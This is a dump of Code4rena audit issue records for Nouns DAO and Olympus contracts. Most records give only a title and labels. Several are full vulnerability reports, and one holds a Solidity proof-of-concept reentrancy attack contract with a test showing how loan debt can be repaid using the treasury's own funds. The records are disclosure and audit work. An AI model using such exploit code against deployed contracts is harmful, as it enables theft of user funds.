"https://github.com/code-423n4/2022-08-nounsdao-findings/issues/28", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/27", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/26", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/24", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/22", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/21", "labels": ["bug", "G (Gas Optimization)", "edited-by-warden"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/20", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/19", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/18", "labels": ["bug", "G (Gas Optimization)", "edited-by-warden"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/16", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/15", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/14", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/13", "labels": ["bug", "G (Gas Optimization)", "edited-by-warden", "old-submission-method"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/12", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/11", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/10", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/8", "labels": ["bug", "QA (Quality Assurance)", "old-submission-method"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/7", "labels": ["bug", "QA (Quality Assurance)", "old-submission-method"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/6", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-nounsdao-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/5", "labels": ["bug", "G (Gas Optimization)", "edited-by-warden"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/2", "labels": ["bug", "G (Gas Optimization)", "edited-by-warden"], "target": "2022-08-nounsdao-findings", "body": "Gas Optimizations"}, {"title": "Agreements & Disclosures", "html_url": "https://github.com/code-423n4/2022-08-nounsdao-findings/issues/1", "labels": [], "target": "2022-08-nounsdao-findings", "body": "Agreements & Disclosures"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/504", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-olympus-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/501", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/500", "labels": ["bug", "QA (Quality Assurance)", "old-submission-method"], "target": "2022-08-olympus-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/499", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/498", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/496", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "QA Report"}, {"title": "Can initialize PRICE module with old market data", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/495", "labels": ["bug", "disagree with severity", "QA (Quality Assurance)"], "target": "2022-08-olympus-findings", "body": "Can initialize PRICE module with old market data"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/493", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-olympus-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/491", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/488", "labels": ["bug", "G (Gas Optimization)", "sponsor disputed", "old-submission-method"], "target": "2022-08-olympus-findings", "body": "Gas Optimizations"}, {"title": "Cushion bond markets are opened at wall price rather than current price", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/485", "labels": ["bug", "2 (Med Risk)", "disagree with severity"], "target": "2022-08-olympus-findings", "body": "Cushion bond markets are opened at wall price rather than current price"}, {"title": "Moving average precision is lost", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/483", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed", "old-submission-method"], "target": "2022-08-olympus-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L134-L139   # Vulnerability details  Now the precision is lost in moving average calculations as the difference is calculated separately and added each time, while it typically can be small enough to lose precision in the division involved.  For example, `10000` moves of `990` size, `numObservations = 1000`. This will yield `0` on each update, while must yield `9900` increase in the moving average.  ## Proof of Concept  Moving average is calculated with the addition of the difference:  https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L134-L139  ```solidity         // Calculate new moving average         if (currentPrice > earliestPrice) {             _movingAverage += (currentPrice - earliestPrice) / numObs;         } else {             _movingAverage -= (earliestPrice - currentPrice) / numObs;         } ```  `/ numObs` can lose precision as `currentPrice - earliestPrice` is usually small.  It is returned on request as is:  https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L189-L193  ```solidity     /// @notice Get the moving average of OHM in the Reserve asset over the defined window (see movingAverageDuration and observationFrequency).     function getMovingAverage() external view returns (uint256) {         if (!initialized) revert Price_NotInitialized();         return _movingAverage;     } ```  ## Recommended Mitigation Steps  Consider storing the cumulative `sum`, while returning `sum / numObs` on request:  https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L189-L193  ```solidity     /// @notice Get the moving average of OHM in the Reserve asset over the defined window (see movingAverageDuration and observationFrequency).     function getMovingAverage() external view returns (uint256) {         if (!initialized) revert Price_NotInitialized(); -       return _movingAverage; +       return _movingAverage / numObservations;     } ```  "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/481", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-olympus-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/480", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/478", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/473", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-olympus-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/472", "labels": ["bug", "QA (Quality Assurance)", "old-submission-method"], "target": "2022-08-olympus-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/471", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/466", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-olympus-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/463", "labels": ["bug", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-08-olympus-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/462", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "old-submission-method"], "target": "2022-08-olympus-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/460", "labels": ["bug", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-08-olympus-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/459", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/457", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/456", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-olympus-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/455", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-08-olympus-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/454", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-olympus-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/453", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-olympus-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/452", "labels": ["bug", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-08-olympus-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/451", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-olympus-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/450", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/449", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/448", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-olympus-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/444", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/443", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "edited-by-warden"], "target": "2022-08-olympus-findings", "body": "Gas Optimizations"}, {"title": "[NAZ-M1] Chainlink's `latestRoundData` Might Return Stale Results", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/441", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L161 https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L170   # Vulnerability details  ## Impact Across these contracts, you are using Chainlink's `latestRoundData` API, but there is only a check on `updatedAt`. This could lead to stale prices according to the Chainlink documentation:  * [Historical Price data](https://docs.chain.link/docs/historical-price-data/#historical-rounds) * [Checking Your returned answers](https://docs.chain.link/docs/faq/#how-can-i-check-if-the-answer-to-a-round-is-being-carried-over-from-a-previous-round)  The result of `latestRoundData` API will be used across various functions, therefore, a stale price from Chainlink can lead to loss of funds to end-users.  ## Tools Used Manual Review  ## Recommended Mitigation Steps Consider adding the missing checks for stale data.  For example: ```js (uint80 roundID ,answer,, uint256 timestamp, uint80 answeredInRound) = AggregatorV3Interface(chainLinkAggregatorMap[underlying]).latestRoundData();  require(answer > 0, \"Chainlink price <= 0\");  require(answeredInRound >= roundID, \"Stale price\"); require(timestamp != 0, \"Round not complete\"); ```"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/440", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/438", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/437", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/436", "labels": ["bug", "QA (Quality Assurance)", "sponsor disputed"], "target": "2022-08-olympus-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/435", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "Gas Optimizations"}, {"title": "Kernel may not be able to migrate due to having too many keycodes or policies", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/433", "labels": ["bug", "disagree with severity", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-08-olympus-findings", "body": "Kernel may not be able to migrate due to having too many keycodes or policies"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/432", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-olympus-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/430", "labels": ["bug", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-08-olympus-findings", "body": "QA Report"}, {"title": "Treasury module is vulnerable to cross-contract reentrancy", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/426", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L108-L112   # Vulnerability details  ## Impact An attacker can pay back their loan to the treasury module with protocol-owned tokens. This will cause their loan to decrease despite the protocol won't be given funds for it.  ## Proof of Concept The code first measures the number of tokens in the treasury, then transfers an amount to the contract and checks the change it caused. This is put behind a nonReentrant modifier so that one can't use the same balance change to pay back multiple parts of (potentially) multiple loans.  The problem arises when the treasury doesn't only claim tokens from paying back loans, but also claims protocol revenue. Since, an attacker can gain execution in the moment the funds are pulled to the treasury to trigger any function that grants treasury this type of tokens (collects protocol revenue). The contract will count these tokens as paying back one's loan since this happened between balance measurements.  ## Recommended Mitigation Steps Add a function used to pull a token to the contract and mark it nonReentrant. Any transfer of tokens to the treasury should be done through that function."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/425", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/424", "labels": ["bug", "QA (Quality Assurance)", "sponsor disputed"], "target": "2022-08-olympus-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/423", "labels": ["bug", "QA (Quality Assurance)", "sponsor disputed"], "target": "2022-08-olympus-findings", "body": "QA Report"}, {"title": "low market bonds/swaps not working after loan is taken from treasury", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/422", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L60   # Vulnerability details  ## Impact low market bonds/swaps not working after loan is taken from TRSRY  I am bordering between this being medium and low, but since this is, granted under very unlikely circumstances, is hindering intended transfers to work I am submitting it as medium. That said, I don't think this scenario is very likely since it requires a trusted contract not part of initial release(? no contract in repo used a loan) to take a large loan from TRSRY.  ## Proof of Concept this will cause test to fail on TRANSFER_FAILED due to TRSRY not having the tokens to transfer but `getReserveBalance` says it has, since capacity is determined based on non-existing tokens.  ```diff diff --git a/src/test/policies/Operator.t.sol b/src/test/policies/Operator.t.sol index e09aec1..5c1e95f 100644 --- a/src/test/policies/Operator.t.sol +++ b/src/test/policies/Operator.t.sol @@ -26,6 +26,8 @@ import {OlympusMinter, OHM} from \"modules/MINTR.sol\";  import {Operator} from \"policies/Operator.sol\";  import {BondCallback} from \"policies/BondCallback.sol\";   +import {ModuleTestFixtureGenerator} from \"test/lib/ModuleTestFixtureGenerator.sol\"; +  contract MockOhm is ERC20 {      constructor(          string memory _name, @@ -45,6 +47,7 @@ contract MockOhm is ERC20 {  // solhint-disable-next-line max-states-count  contract OperatorTest is Test {      using FullMath for uint256; +    using ModuleTestFixtureGenerator for OlympusTreasury;        UserFactory public userCreator;      address internal alice; @@ -53,6 +56,9 @@ contract OperatorTest is Test {      address internal policy;      address internal heart;   +    address public debtor; +    address public godmode;  +      RolesAuthority internal auth;      BondAggregator internal aggregator;      BondFixedTermTeller internal teller; @@ -187,6 +193,18 @@ contract OperatorTest is Test {            reserve.mint(address(treasury), testReserve * 100);   +        debtor = treasury.generateFunctionFixture(treasury.getLoan.selector); +        godmode = treasury.generateGodmodeFixture(type(OlympusTreasury).name); +         +        kernel.executeAction(Actions.ActivatePolicy, godmode); +        kernel.executeAction(Actions.ActivatePolicy, debtor); +         +        vm.prank(godmode); +        treasury.setApprovalFor(debtor, reserve, testReserve * 100); + +        vm.prank(debtor); +        treasury.getLoan(reserve,testReserve*100); +          // Approve the operator and bond teller for the tokens to swap          vm.prank(alice);          ohm.approve(address(operator), testOhm * 20); ```  same is applicable for low market bonds since they are created based on the same capacity  ## Tools Used vs code + tests  ## Recommended Mitigation Steps determine capacity from actual tokens held by treasury."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/417", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/415", "labels": ["bug", "QA (Quality Assurance)", "old-submission-method"], "target": "2022-08-olympus-findings", "body": "QA Report"}, {"title": "TRSRY: front-runnable `setApprovalFor`", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/410", "labels": ["bug", "3 (High Risk)", "sponsor confirmed", "old-submission-method"], "target": "2022-08-olympus-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/TRSRY.sol#L64-L72 https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/TreasuryCustodian.sol#L42-L48   # Vulnerability details  ## Impact  An attacker may be able to withdraw more than intended  ## Proof of Concept  Let's say the alice had approval of 100. Now the treasury custodian reduced the approval to 50. Alice could frontrun the `setApprovalFor` of 50, and withdraw 100 as it was before. Then withdraw 50 with the newly set approval. So the alice could withdraw 150.  ```solidity // modules/TRSRY.sol   63     /// @notice Sets approval for specific withdrawer addresses  64     function setApprovalFor(  65         address withdrawer_,  66         ERC20 token_,  67         uint256 amount_  68     ) external permissioned {  69         withdrawApproval[withdrawer_][token_] = amount_;  70  71         emit ApprovedForWithdrawal(withdrawer_, token_, amount_);  72     } ```  The `TreasuryCustodian` simply calls the `setApprovalFor` to grant Approval. ```solidity  41  42     function grantApproval(  43         address for_,  44         ERC20 token_,  45         uint256 amount_  46     ) external onlyRole(\"custodian\") {  47         TRSRY.setApprovalFor(for_, token_, amount_);  48     } ```   ## Tools Used  none  ## Recommended Mitigation Steps  Instead of setting the given amount, one can reduce from the current approval. By doing so, it checks whether the previous approval is spend.  <!-- zzzitron M06 -->    "}, {"title": "Operator: if WallSpread is 10000, `operate` and `beat` will revert and price information cannot be updated anymore", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/404", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "old-submission-method"], "target": "2022-08-olympus-findings", "body": "Operator: if WallSpread is 10000, `operate` and `beat` will revert and price information cannot be updated anymore"}, {"title": "TRSRY: reenter from OlympusTreasury::repayLoan to Operator::swap", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/403", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed", "old-submission-method"], "target": "2022-08-olympus-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/TRSRY.sol#L105-L112 https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L330   # Vulnerability details  ## Impact  One can repay loan to the treasury with the value from the Operator::swap  Condition:   - the reserve token in Operator has hook for sender (like ERC777)   - the debt is the same token as reserve  ## Proof of Concept   The below code snippet shows a part of proof of concept for reentrancy attack, which is based on `src/test/policies/Operator.t.sol`. The full test code can be found [here](https://gist.github.com/zzzitron/651e1451ac1ff21be8a72b502b26f7cb), and [git diff from the `Operator.t.sol`](https://gist.github.com/zzzitron/5b8ebe635ed1939f18a100c7940b4f11).  Let's say that the reserve token implements ERC777 with the hook for the sender [(see weird erc20)](https://github.com/d-xo/weird-erc20#reentrant-calls). If the attacker can take debt of the reserve currency for the attack contract `Reenterer`, the contract can call `OlympusTreasury::repayLoan` and in the middle of repay call `Operator::swap` function. The `swap` function will modify the reserve token balance of treasury and the amount the attacker swapped will be also be used for the `repayLoan`.  In the below example, the attacker has debt of 1e18, and repays 1e17. But since the `swap` function is called in the `repayLoan`, the debt is reduced 1e17 more then it should. And the swap happened as expected so the attack has the corresponding ohm token.  ```solidity /// Mock to simulate the senders hook /// for simplicity omitted the certain aspects like ERC1820 registry and etc. contract MockERC777 is MockERC20 {     constructor () MockERC20(\"ERC777\", \"777\", 18) {}      function transferFrom(address from, address to, uint256 amount) public override returns (bool) {         _callTokenToSend(from, to, amount);         return super.transferFrom(from, to, amount);         // _callTokenReceived(from, to, amount);     }      // simplified implementation for ERC777     function _callTokenToSend(address from, address to, uint256 amount) private {       if (from != address(0)) {         IERC777Sender(from).tokensToSend(from, to, amount);       }     } }  interface IERC777Sender {   function tokensToSend(address from, address to, uint256 amount) external; }  /// Concept for an attack contract contract Reenterer is IERC777Sender {   ERC20 public token;   Operator public operator;   bool public entered;    constructor(address token_, Operator op_) {     token = ERC20(token_);     operator = op_;   }    function tokensToSend(address from, address to, uint256 amount) external override {     if (!entered) {     // call swap from reenter     // which will manipulate the balance of treasury       entered = true;       operator.swap(token, 1e17, 0);     }   }      function attack(OlympusTreasury treasury) public {     // approve to the treasury     token.approve(address(treasury), 1e18);     token.approve(address(operator), 100* 1e18);      // repayDebt of 1e17     treasury.repayLoan(token, 1e17);   } } ```  ```solidity /// the test     function test_poc__reenter() public {         vm.prank(guardian);         operator.initialize();        reserve.mint(address(reenterer), 1e18);       assertEq(treasury.reserveDebt(reserve, address(reenterer)), 1e18);       // start repayLoan       reenterer.attack(treasury);       // it should be 9 * 1e17 but it is 8 * 1e17       assertEq(treasury.reserveDebt(reserve, address(reenterer)), 8*1e17);     } ```  ## Cause  The `repayLoan`, in the line 110 below,  calls the `safeTransferFrom`. The balance before and after are compared to determine how much of debt is paid. So, if the `safeTranferFrom` can modify the balance, the attacker can profit from it.  ```solidity // OlympusTreasury::repayLoan // https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/TRSRY.sol#L105-L112 105     function repayLoan(ERC20 token_, uint256 amount_) external nonReentrant { 106         if (reserveDebt[token_][msg.sender] == 0) revert TRSRY_NoDebtOutstanding(); 107 108         // Deposit from caller first (to handle nonstandard token transfers) 109         uint256 prevBalance = token_.balanceOf(address(this)); 110         token_.safeTransferFrom(msg.sender, address(this), amount_); 111 112         uint256 received = token_.balanceOf(address(this)) - prevBalance; ```  In the `swap` function, if the amount in token is reserve, the payment token to buy ohm will be paid to the treasury. It gives to an opportunity to modify the balance.  ```solidity // Operator::swap // https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L330 329             /// Transfer reserves to treasury 330             reserve.safeTransferFrom(msg.sender, address(TRSRY), amountIn_); ```  Although both of `Operator::swap` and `OlympusTreasury::repayLoan` have `nonReentrant` modifier, it does not prevent as they are two different contracts.  ## Tools Used  foundry  ## Recommended Mitigation Steps  The deposit logic in the `OlympusTreasury::repayLoan` was trying to handle nonstandard tokens, such as fee-on-transfer. But by doing so introduced an attack vector for tokens with ERC777. If the reserve token should be decided in the governance, it should be clarified, which token standards can be used safely.   <!-- zzzitron M00 -->    "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/401", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/400", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-olympus-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/398", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/396", "labels": ["bug", "QA (Quality Assurance)", "edited-by-warden"], "target": "2022-08-olympus-findings", "body": "QA Report"}, {"title": "Anyone can pass any proposal alone before first `VOTES` are minted", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/392", "labels": ["bug", "3 (High Risk)", "sponsor acknowledged"], "target": "2022-08-olympus-findings", "body": "Anyone can pass any proposal alone before first `VOTES` are minted"}, {"title": "Inconsistency in staleness checks between OHM and reserve token oracles", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/391", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L165-L171   # Vulnerability details  ## Impact Price oracle may fail and revert due to the inconsistency in the staleness checks.   ## Proof of Concept  In the `getCurrentPrice()` of `PRICE.sol`, Chainlink oracles are used to get the price of OHM against a reserve token, and a staleness check is used to make sure the price oracles are reporting fresh data. Yet the freshness requirements are inconsistent, for OHM, `updatedAt` should be lower than current timestamp minus three times the observation frequency, while for the reserve price, it is required that `updatedAt` should be lower than current timestamp minus the observation frequency. Our understanding is that that frequency is multiplied by 3 so that there can be some meaningful room where price 